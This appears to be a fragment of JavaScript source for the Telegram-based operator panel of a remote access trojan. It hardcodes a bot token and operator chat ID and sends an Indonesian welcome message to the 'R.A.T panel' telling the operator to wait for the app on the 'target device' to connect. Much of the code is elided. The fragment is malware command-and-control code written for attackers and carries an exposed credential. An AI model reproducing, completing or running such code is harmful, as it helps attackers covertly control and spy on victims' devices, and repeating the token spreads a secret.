...
const token = '7732099220:AAEe0HLYJ-7MNW3UN1TBSH1GuWTOseGIN4U'
const id = '7953841468'
...
appBot.on('message', (message) => {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝙎𝙚𝙡𝙖𝙢𝙖𝙩 𝙙𝙖𝙩𝙖𝙣𝙜 𝙙𝙞 𝙋𝙖𝙣𝙚𝙡 𝙍.𝘼.𝙏\n\n' +
                '• ᴊɪᴋᴀ ᴀᴘʟɪᴋᴀꜱɪ ᴛᴇʟᴀʜ ᴛᴇʀᴘᴀꜱᴀɴɢ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ, ᴛᴜɴɢɢᴜ ꜱᴀᴍᴘᴀɪ ᴛᴇʀʜᴜʙᴜɴg\n\n' +
                ...
                '• ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛᴇʀᴊᴇbᴀk ᴅɪ ᴛᴇɴɢᴀʜ ʙᴏᴛ, ᴋɪʀɪᴍ ᴘᴇʀɪɴᴛᴀʜ /start ᴜɴᴛᴜᴋ meᴍᴜʟᴀɪ ulang ᴅᴀʀɪ awal\n\n' +
